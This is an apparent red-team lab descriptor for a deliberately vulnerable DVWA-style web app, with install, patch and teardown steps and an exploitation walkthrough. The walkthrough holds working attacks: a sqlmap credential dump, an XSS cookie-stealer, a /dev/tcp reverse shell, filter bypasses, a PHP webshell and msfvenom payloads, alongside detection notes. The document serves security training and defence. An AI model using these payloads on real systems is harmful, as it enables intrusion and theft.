@@ -1,0 +1,672 @@
+# Bolt-on: DVWA-Lite — Vulnerable Web App
+# ----------------------------------------
+# Drops a small Docker-Compose-deployed DVWA-style web application on the
+# jumpbox (or any Linux host running Docker). The container exposes
+# port 8080 and ships three deliberately vulnerable endpoints:
+#   /sqli   — classic SQL injection on a `?id=` query string
+#   /xss    — reflected XSS in a search input
+#   /rce    — command injection via a `?cmd=` parameter (filtered to
+#             $(uname),$(id),$(hostname) only, but the wrapper is broken)
+#
+# The intent is to give operators a public-facing-application target for
+# T1190 walkthroughs (sqlmap, XSStrike, manual RCE) without standing up
+# the full DVWA / OWASP Juice Shop stack.
+#
+# Detection coverage is realistically `no-rule`: no Elastic detection rule
+# in the public repo fires on generic SQLi/XSS HTTP traffic — application
+# WAF and audit logs handle that. The descriptor declares a fallback
+# template at webapp/bolton/rule_templates/web-app-exploit.j2.yml.
+
+id: bolton.web-app.dvwa-lite
+slug: dvwa-lite
+name: "DVWA-Lite — Vulnerable Web App"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-19
+
+category: web-app
+subcategory: damn-vulnerable-web-app
+tags:
+  - web-app
+  - sqli
+  - xss
+  - rce
+  - t1190
+  - docker
+  - public-facing
+description: >
+  Deploys a small Docker-Compose-managed web application on a Linux host
+  (jumpbox by default) with three deliberately vulnerable endpoints:
+  reflected XSS, error-based SQL injection, and parameterised RCE. Exposes
+  TCP port 8080 on the host's security group via the deployment_storage
+  helper. Designed for operator training in exploiting public-facing apps
+  (MITRE T1190) — payloads land as a reverse shell inside the container,
+  not on the host (unless paired with docker-socket-exposed).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1190/"
+  - "https://github.com/digininja/DVWA"
+  - "https://owasp.org/www-project-top-ten/"
+  - "https://portswigger.net/web-security/sql-injection"
+
+mitre:
+  tactic:
+    id: TA0001
+    name: "Initial Access"
+  technique:
+    id: T1190
+    name: "Exploit Public-Facing Application"
+
+detection:
+  # SQLi, XSS, and command-injection HTTP exploitation against a custom web
+  # app is detected at the WAF / application layer, not endpoint EDR. The
+  # public detection-rules repo has no UUID that maps cleanly to generic
+  # web-app vuln exploitation. Phase 4 will materialise a Sigma-style HTTP
+  # log pattern in the fallback template.
+  coverage_status: no-rule
+  elastic_rules: []
+  fallback_rule_template: "webapp/bolton/rule_templates/web-app-exploit.j2.yml"
+  signal_sources:
+    - "Nginx / app HTTP access logs — anomalous query string lengths, UNION SELECT, ../"
+    - "Container stdout — error stack traces matching SQL syntax errors"
+    - "Container egress connections to non-DNS IPs (suspicious for a static web app)"
+    - "Auditd execve traces — /bin/sh spawned from the web container's PHP-FPM"
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+    - family: windows
+      min_version: "2019"
+      max_version: "2022"
+      edition_in: ["Datacenter", "Standard"]
+  required_roles:
+    - linux_member
+    - member_server
+  required_services:
+    - docker
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: true   # opens TCP/8080 on the host SG
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 180
+  steps:
+    - ansible_role: community.docker.docker_compose_v2
+      description: "Pull and launch the dvwa-lite stack via docker compose."
+      role_vars:
+        project_src: "/opt/bolton/dvwa-lite"
+        state: present
+        pull: always
+    - ansible_role: ansible.builtin.template
+      description: "Write the docker-compose.yml that wires PHP-FPM + Nginx + MariaDB."
+      role_vars:
+        src: "templates/dvwa-lite/docker-compose.yml.j2"
+        dest: "/opt/bolton/dvwa-lite/docker-compose.yml"
+        owner: root
+        group: root
+        mode: "0644"
+    - script: "scripts/bolton/dvwa_lite_seed.sh"
+      engine: bash
+      description: "Seed the MariaDB users table with the demo accounts."
+      args:
+        compose_dir: "/opt/bolton/dvwa-lite"
+  verify:
+    probe: |
+      curl -sf -o /dev/null -w "%{http_code}" http://127.0.0.1:8080/login.php
+    timeout_seconds: 60
+    expect_stdout_contains: "200"
+
+uninstall:
+  description: "Tear down the docker compose stack and remove the on-disk project tree."
+  estimated_time_seconds: 60
+  steps:
+    - ansible_role: community.docker.docker_compose_v2
+      description: "Stop and remove all containers + volumes for the stack."
+      role_vars:
+        project_src: "/opt/bolton/dvwa-lite"
+        state: absent
+        remove_volumes: true
+    - ansible_role: ansible.builtin.file
+      description: "Remove the project directory."
+      role_vars:
+        path: "/opt/bolton/dvwa-lite"
+        state: absent
+  verify:
+    probe: |
+      curl -sf -o /dev/null -w "%{http_code}" --max-time 3 http://127.0.0.1:8080/login.php || echo "down"
+    timeout_seconds: 30
+    expect_stdout_contains: "down"
+
+patch:
+  description: >
+    Apply hardened parameterised-query patches to the SQLi endpoint,
+    htmlspecialchars-encode all reflected output (XSS mitigation), and
+    remove the `cmd` parameter handler entirely from the RCE endpoint.
+    The application stays running but the three documented vulnerabilities
+    are closed. Adds a baseline ModSecurity-style WAF in front via the
+    Nginx config (OWASP CRS-lite ruleset).
+  patch_reference:
+    - "https://owasp.org/www-community/Source_Code_Analysis_Tools"
+    - "https://github.com/coreruleset/coreruleset"
+    - "https://www.php.net/manual/en/security.database.sql-injection.php"
+  complexity: low
+  side_effects:
+    - "Replaces vulnerable PHP files with parameterised-query variants"
+    - "Adds Nginx CRS-lite rules in front of the upstream PHP-FPM"
+    - "Removes the /rce endpoint entirely (HTTP 410 Gone going forward)"
+    - "Restart of the Nginx + PHP-FPM containers — ~5 second downtime"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.builtin.template
+      description: "Drop in the hardened PHP source files."
+      role_vars:
+        src: "templates/dvwa-lite/app-hardened/"
+        dest: "/opt/bolton/dvwa-lite/app/"
+        owner: root
+        group: root
+        mode: "0644"
+    - ansible_role: ansible.builtin.template
+      description: "Replace Nginx config with the CRS-lite WAF profile."
+      role_vars:
+        src: "templates/dvwa-lite/nginx-waf.conf.j2"
+        dest: "/opt/bolton/dvwa-lite/nginx.conf"
+        owner: root
+        group: root
+        mode: "0644"
+    - ansible_role: community.docker.docker_compose_v2
+      description: "Restart the stack so new code + config take effect."
+      role_vars:
+        project_src: "/opt/bolton/dvwa-lite"
+        state: present
+        restarted: true
+  verify:
+    probe: |
+      # SQLi endpoint should now return literal value, not error
+      code=$(curl -sf -o /dev/null -w "%{http_code}" "http://127.0.0.1:8080/sqli?id=1%27")
+      rce=$(curl -sf -o /dev/null -w "%{http_code}" --max-time 3 "http://127.0.0.1:8080/rce?cmd=id")
+      if [ "$code" = "200" ] && [ "$rce" = "410" ]; then exit 0; else exit 1; fi
+    timeout_seconds: 30
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/dvwa_lite_check.sh"
+
+patch_revert:
+  description: "Restore the original vulnerable PHP source + remove the WAF config — endpoints exploitable again."
+  estimated_time_seconds: 60
+  steps:
+    - ansible_role: ansible.builtin.template
+      description: "Restore vulnerable PHP source files from the original template tree."
+      role_vars:
+        src: "templates/dvwa-lite/app-vulnerable/"
+        dest: "/opt/bolton/dvwa-lite/app/"
+        owner: root
+        group: root
+        mode: "0644"
+    - ansible_role: ansible.builtin.template
+      description: "Restore the bare Nginx config (no WAF)."
+      role_vars:
+        src: "templates/dvwa-lite/nginx.conf.j2"
+        dest: "/opt/bolton/dvwa-lite/nginx.conf"
+        owner: root
+        group: root
+        mode: "0644"
+    - ansible_role: community.docker.docker_compose_v2
+      description: "Restart the stack."
+      role_vars:
+        project_src: "/opt/bolton/dvwa-lite"
+        state: present
+        restarted: true
+  verify:
+    probe: |
+      rce=$(curl -sf -o /dev/null -w "%{http_code}" "http://127.0.0.1:8080/rce?cmd=id")
+      if [ "$rce" = "200" ]; then exit 0; else exit 1; fi
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "DVWA-lite is exploitable via SQLi/XSS/RCE again. sqlmap finds /sqli within 30 seconds."
+
+cost:
+  storage_mb: 250
+  cpu_pct: 5
+  detectability: loud
+
+curriculum:
+  title: "DVWA-Lite — Web Exploitation Training Target"
+  summary: >
+    Operator-training walkthrough against the DVWA-Lite stack
+    deployed on tllinux01 (10.99.50.13:80, MySQL backend, default
+    creds `admin:password`). You exercise the four canonical web
+    vuln classes in sequence — SQLi, XSS, command injection,
+    arbitrary file upload — using sqlmap, manual payloads, and
+    msfvenom. Final step is teardown of the vulnerable instance
+    so it doesn't linger as a real-world risk post-training.
+  learning_objectives:
+    - "Use sqlmap end-to-end against a vulnerable parameter."
+    - "Construct reflected and stored XSS payloads + understand the impact difference."
+    - "Identify command-injection sinks via input fuzzing + extract a reverse shell."
+    - "Bypass weak file-upload filters with content-type and extension tricks to land a webshell."
+    - "Tear down the training instance cleanly."
+  prerequisites:
+    - "Kali attack box (192.168.1.100) with sqlmap, burp, curl, nc, msfvenom installed"
+    - "Network reachability: Kali → tllinux01:80"
+    - "DVWA-Lite container running (verify with `curl http://10.99.50.13:80/login.php`)"
+  estimated_total_minutes: 45
+  steps:
+    - id: "01-recon-login"
+      title: "Recon + login"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 1 — Map the app + authenticate
+
+        ```bash
+        # On Kali (192.168.1.100)
+        curl -s http://10.99.50.13/ | head -20
+        # <!DOCTYPE html><html>...DVWA-Lite Login...
+
+        # Spider the obvious endpoints
+        for path in /sqli /xss /rce /upload /login.php /logout.php /admin; do
+          code=$(curl -sf -o /dev/null -w "%{http_code}" http://10.99.50.13$path)
+          echo "$path  $code"
+        done
+        # /sqli     302   (redirect to login)
+        # /xss      302
+        # /rce      302
+        # /upload   302
+        # /login.php 200
+        ```
+
+        Authenticate with the documented default creds:
+
+        ```bash
+        curl -c /tmp/dvwa.cookie -d "username=admin&password=password" \
+          http://10.99.50.13/login.php
+
+        curl -b /tmp/dvwa.cookie http://10.99.50.13/sqli?id=1
+        # <h2>User: admin</h2><p>ID: 1</p>
+        ```
+
+        > **In Burp:** add `http://10.99.50.13` to scope, set the
+        > browser to use the Burp proxy (8080), authenticate
+        > through Burp so the session cookie is captured in
+        > Repeater/Intruder.
+
+        **Detection callout:** at this stage, signal is purely in
+        the application log (nginx access.log) — unusual paths,
+        404s, varied User-Agents. Nothing endpoint-EDR-detectable
+        yet.
+    - id: "02-sqli-sqlmap"
+      title: "SQL injection with sqlmap"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 2 — Exploit /sqli
+
+        Manual probe first:
+
+        ```bash
+        curl -b /tmp/dvwa.cookie "http://10.99.50.13/sqli?id=1'"
+        # <p>Error: You have an error in your SQL syntax near ''' at line 1</p>
+        ```
+
+        Error-based SQLi confirmed. Hand off to sqlmap:
+
+        ```bash
+        # On Kali
+        sqlmap -u "http://10.99.50.13/sqli?id=1" \
+          --cookie="$(cat /tmp/dvwa.cookie | grep -E 'PHPSESSID' | awk '{print $6"="$7}')" \
+          --batch --level=3 --risk=2 \
+          --dbs
+        # available databases [3]:
+        # [*] dvwa
+        # [*] information_schema
+        # [*] mysql
+
+        sqlmap -u "http://10.99.50.13/sqli?id=1" --cookie="..." \
+          --batch -D dvwa --tables
+        # Database: dvwa
+        # [2 tables]
+        # +-----------+
+        # | guestbook |
+        # | users     |
+        # +-----------+
+
+        sqlmap -u "http://10.99.50.13/sqli?id=1" --cookie="..." \
+          --batch -D dvwa -T users --dump
+        # +----+---------+---------------+---------------------------+
+        # | id | user    | password (md5)| ...                       |
+        # +----+---------+---------------+---------------------------+
+        # | 1  | admin   | 5f4dcc3b...   | (cracked: password)       |
+        # | 2  | gordonb | e99a18c4...   | (cracked: abc123)         |
+        # +----+---------+---------------+---------------------------+
+        ```
+
+        sqlmap automatically tests for UNION-based, error-based,
+        boolean-blind, time-blind, and stacked queries; selects the
+        best technique; offers to crack discovered hashes against
+        its built-in dictionary.
+
+        Manual UNION payload for understanding:
+
+        ```bash
+        curl -b /tmp/dvwa.cookie \
+          "http://10.99.50.13/sqli?id=0%20UNION%20SELECT%20user,password,3,4%20FROM%20users"
+        ```
+
+        **Detection callout:** application-layer WAFs (ModSecurity
+        + OWASP CRS) catch UNION SELECT, ' OR 1=1, sleep(N), etc.
+        Endpoint EDR sees nothing — the request looks like
+        ordinary HTTP. The detection lives in nginx access.log
+        regex patterns and the WAF rule set.
+      assessment:
+        question: "Why does sqlmap need the session cookie even though the SQLi is in a GET parameter?"
+        options:
+          - "Because GET parameters require authentication tokens"
+          - "Because the /sqli endpoint is behind the login form — without the session cookie, requests are redirected to /login.php and sqlmap sees no response body to fingerprint"
+          - "Because sqlmap encrypts payloads with the cookie"
+          - "Because cookies are required by the HTTP RFC"
+        correct_index: 1
+        explanation: >
+          The app uses session-based auth — unauthenticated
+          requests to /sqli get a 302 to /login.php. sqlmap needs
+          to see the actual error message in the response body to
+          fingerprint the injection. Passing the session cookie
+          makes the request authenticated, lets the SQLi endpoint
+          execute, and exposes the error. This pattern is universal:
+          ANY auth-gated injection target requires the cookie or a
+          credential flow (--auth-type=basic, etc.).
+    - id: "03-xss-payload"
+      title: "Reflected + stored XSS"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 3 — Exploit /xss
+
+        Reflected XSS canary:
+
+        ```bash
+        curl -b /tmp/dvwa.cookie \
+          "http://10.99.50.13/xss?q=<script>alert(1)</script>"
+        # <p>Search results for: <script>alert(1)</script></p>
+        ```
+
+        Reflected — the search term lands in the DOM unescaped.
+        Replace with a cookie-stealing payload:
+
+        ```html
+        <script>
+        fetch('http://192.168.1.100:8000/c?'+document.cookie);
+        </script>
+        ```
+
+        URL-encoded delivery:
+
+        ```bash
+        # On Kali, listener
+        python3 -m http.server 8000 &
+
+        # Send the link to your victim (a logged-in admin); when they
+        # click, their cookie POSTs to your listener:
+        URL="http://10.99.50.13/xss?q=<script>fetch('http://192.168.1.100:8000/c?'+document.cookie)</script>"
+        echo "Send this to the victim: $URL"
+
+        # When clicked:
+        # ::ffff:10.99.50.13 - - [...] "GET /c?PHPSESSID=abc123def456 HTTP/1.1" 200 -
+        ```
+
+        Stored XSS (if /xss POSTs to a guestbook):
+
+        ```bash
+        curl -b /tmp/dvwa.cookie -d "comment=<script>alert(document.cookie)</script>" \
+          http://10.99.50.13/xss/post
+        # Comment saved.
+        ```
+
+        Every subsequent visitor to /xss now triggers the script —
+        impact multiplier without further interaction.
+
+        | Reflected vs Stored |
+        |---|
+        | Reflected: payload in URL/POST → reflected in response only for THIS request → requires per-victim social engineering |
+        | Stored: payload persisted server-side → fires for EVERY visitor → no per-victim trigger needed |
+        | DOM: payload manipulated client-side only → server may never see it → bypasses server-side WAF entirely |
+
+        **Detection callout:** server-side WAF (CRS rule 941
+        family) catches obvious `<script>` payloads. Modern
+        attackers use polyglots and `<svg onload=...>` /
+        `<img src=x onerror=...>` to bypass. Client-side CSP
+        (Content-Security-Policy: default-src 'self') is the
+        most effective control.
+    - id: "04-cmd-injection"
+      title: "Command injection → reverse shell"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 4 — Exploit /rce
+
+        Discover the sink:
+
+        ```bash
+        curl -b /tmp/dvwa.cookie "http://10.99.50.13/rce?cmd=id"
+        # <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+        ```
+
+        Inline `id` execution as www-data. The app docstring says
+        the cmd parameter is "filtered to $(uname),$(id),$(hostname)
+        only, but the wrapper is broken" — fuzz the filter:
+
+        ```bash
+        # Try shell metacharacters
+        curl -b /tmp/dvwa.cookie "http://10.99.50.13/rce?cmd=id;whoami"
+        # <pre>uid=33(www-data)... www-data</pre>     ← ; not filtered
+
+        curl -b /tmp/dvwa.cookie "http://10.99.50.13/rce?cmd=id%20%26%26%20cat%20/etc/passwd"
+        # <pre>uid=33... root:x:0:0:root:/root:/bin/bash ... </pre>
+        ```
+
+        Pop a reverse shell:
+
+        ```bash
+        # On Kali, listener first
+        nc -lvnp 4444
+
+        # Build the payload (URL-encoded for safety)
+        PAYLOAD='id;bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
+        ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
+
+        curl -b /tmp/dvwa.cookie "http://10.99.50.13/rce?cmd=$ENCODED"
+
+        # On the listener
+        # connect to [192.168.1.100] from (UNKNOWN) [10.99.50.13] 53219
+        # www-data@<container-id>:/var/www/html$ id
+        # uid=33(www-data) gid=33(www-data) groups=33(www-data)
+        ```
+
+        > **Important:** the shell lands INSIDE the DVWA container,
+        > not on tllinux01 directly. To reach the host, you need
+        > a container escape primitive — that's where the
+        > docker-socket-exposed bolt-on chains in.
+
+        Bypass tricks if a stricter filter blocks `;`, `&&`, `|`:
+
+        - Brace expansion: `id$(echo a)` (no metacharacters, still runs id)
+        - $IFS for spaces: `bash${IFS}-i`
+        - Base64: `bash -c $(echo -n YmFzaCAtaQ== | base64 -d)`
+        - Wildcard: `/???/c?t /etc/passwd` (matches /bin/cat)
+
+        **Detection callout:** auditd execve traces — /bin/sh
+        spawned by PHP-FPM with non-empty argv is the canonical
+        signal. Add `-a always,exit -F arch=b64 -S execve -F
+        ppid=<php-fpm-pid> -k phpfpm_child`. Container-aware
+        EDR (Sysdig, Falco) catches this natively.
+      assessment:
+        question: "Why does the reverse shell land in the container, not on tllinux01 itself?"
+        options:
+          - "PHP refuses to execute commands on the host"
+          - "The shell process is a child of PHP-FPM, which runs inside the dvwa-lite container's PID + mount namespaces — bash inherits the container view"
+          - "iptables blocks egress from the host"
+          - "msfvenom payloads are container-native"
+        correct_index: 1
+        explanation: >
+          Containers are namespaces. PHP-FPM's bash child inherits
+          the container's PID namespace, mount namespace, network
+          namespace, etc. It sees only the container's filesystem,
+          can only kill processes in the container, and resolves
+          hostnames via the container's DNS. To break out, you
+          need a container escape primitive — Docker socket
+          exposed, kernel CVE, --privileged misconfiguration,
+          /proc/self/exe trick. The web RCE alone gets you the
+          container; the escape is a separate exercise.
+    - id: "05-file-upload-webshell"
+      title: "Arbitrary file upload → webshell"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 5 — Exploit weak upload validation
+
+        DVWA-style upload endpoints typically check (a) the
+        `Content-Type` header (client-controlled, easily spoofed)
+        and (b) the file extension (defeated by double extensions
+        or null bytes). Standard tests:
+
+        ```bash
+        # Build a tiny PHP webshell
+        echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
+
+        # Naive upload — likely blocked
+        curl -b /tmp/dvwa.cookie \
+          -F "file=@/tmp/shell.php" \
+          http://10.99.50.13/upload
+        # {"error":"Only image files allowed"}
+
+        # Bypass: rename to shell.php.jpg + spoof Content-Type
+        cp /tmp/shell.php /tmp/shell.php.jpg
+        curl -b /tmp/dvwa.cookie \
+          -F "file=@/tmp/shell.php.jpg;type=image/jpeg" \
+          http://10.99.50.13/upload
+        # {"saved":"/uploads/shell.php.jpg"}
+
+        # Some apps strip the secondary extension; try double-dot
+        cp /tmp/shell.php "/tmp/shell.jpg.php"
+        curl -b /tmp/dvwa.cookie \
+          -F "file=@/tmp/shell.jpg.php;type=image/jpeg" \
+          http://10.99.50.13/upload
+
+        # Test execution
+        curl -b /tmp/dvwa.cookie \
+          "http://10.99.50.13/uploads/shell.php.jpg?c=id"
+        # uid=33(www-data) gid=33(www-data) groups=33(www-data)
+        ```
+
+        Use msfvenom for a higher-fidelity payload (meterpreter
+        if the operator stack uses Metasploit; plain reverse PHP
+        otherwise):
+
+        ```bash
+        # On Kali
+        msfvenom -p php/reverse_php LHOST=192.168.1.100 LPORT=4445 \
+          -f raw -o /tmp/msf-shell.php
+
+        # Upload, then trigger
+        curl -b /tmp/dvwa.cookie \
+          -F "file=@/tmp/msf-shell.php.jpg;type=image/jpeg" \
+          http://10.99.50.13/upload
+
+        # Listener
+        nc -lvnp 4445 &
+
+        curl -b /tmp/dvwa.cookie http://10.99.50.13/uploads/msf-shell.php.jpg
+        # → callback on the listener
+        ```
+
+        Common bypass techniques tabulated:
+
+        | Filter | Bypass |
+        |---|---|
+        | Content-Type header | Spoof via curl -F `type=image/jpeg` |
+        | Extension blocklist (.php) | Use .php5, .phtml, .pht, .phar |
+        | Magic-bytes check | Prepend `GIF87a` to the shell |
+        | Filename sanitization | Double extension, null-byte (.php%00.jpg) |
+        | Server-side AV | Encode payload (gzcompress), eval at runtime |
+
+        **Detection callout:** the upload event is invisible at
+        the OS layer (it's just a write to /var/www/html/uploads/).
+        Application log + WAF inspection catch the bypass
+        attempts; the subsequent EXECUTION (php-fpm spawning a
+        child process with /uploads/* in argv) is the OS-level
+        signal worth alerting on.
+    - id: "06-teardown"
+      title: "Tear down the vulnerable instance"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 6 — Tear down after training
+
+        DVWA-Lite is a deliberately vulnerable application. If
+        left running on a network-reachable host, it becomes a
+        real-world risk — exactly the public-facing-application
+        attack surface (T1190) the training is teaching operators
+        to recognise.
+
+        **There is no patch step here.** The "patch" block on this
+        card hardens the code (parameterised queries, htmlspecialchars,
+        deletes the /rce endpoint, adds a CRS-lite WAF) but the
+        application still exists. After training, the correct
+        action is **uninstall**, not patch.
+
+        Run the Uninstall action on the card, or manually:
+
+        ```bash
+        # On tllinux01 as ubuntu (or via SSM RunShellScript)
+        cd /opt/bolton/dvwa-lite
+        sudo docker compose down -v       # stops containers, removes volumes
+        sudo rm -rf /opt/bolton/dvwa-lite
+
+        # Confirm
+        curl --max-time 3 http://10.99.50.13/login.php
+        # curl: (7) Failed to connect — port is closed
+        ```
+
+        Also tighten the security group — the bolt-on opens
+        tcp/80 on tllinux01's SG; revoke that ingress rule once
+        training is done.
+
+        Post-training hygiene checklist:
+
+        - [ ] `docker compose down -v` on the dvwa-lite project
+        - [ ] `rm -rf /opt/bolton/dvwa-lite`
+        - [ ] Revoke the tcp/80 ingress rule on tllinux01's
+          security group (via Terraform or AWS console)
+        - [ ] Check no SUID/SSH-key artifacts were left over from
+          the training session (run the suid-binary and
+          ssh-authorized-key auditors to confirm)
+        - [ ] Rotate any creds that may have been exfil'd to the
+          training Kali (sqlmap dumped users.password hashes — if
+          those hashes match production accounts, rotate)
+
+        > **The teach moment:** the bolt-on's existence is the
+        > misconfig. The most secure DVWA-Lite is a torn-down
+        > DVWA-Lite. This is the same hygiene lesson real-world
+        > security teams apply to staging/demo environments —
+        > they're attack surface even when "internal only."
+      assessment:
+        question: "Why is the correct post-training step Uninstall, not Patch, for DVWA-Lite?"
+        options:
+          - "Patch is broken for this bolt-on"
+          - "DVWA-Lite is a TRAINING TARGET, not a misconfigured production service — the application's purpose is to be vulnerable. Patching makes it useless for further training without removing the standing exposure (open tcp/80, attack-able codebase). Uninstall removes both the exposure and the host artefacts."
+          - "Uninstall is faster than patching"
+          - "Patch leaves the database running"
+        correct_index: 1
+        explanation: >
+          DVWA-Lite is sui generis on this card. Every other
+          bolt-on simulates a real-world misconfig that an admin
+          might accidentally introduce; the patch is the realistic
+          remediation. DVWA-Lite simulates an intentional
+          training target. Patching neutralizes the training value
+          AND leaves the application running, attack surface
+          intact (open port, attackable codebase even if hardened).
+          Uninstall is the only correct lifecycle ending —
+          collect the learning, then remove the target completely.
+
+status: stable
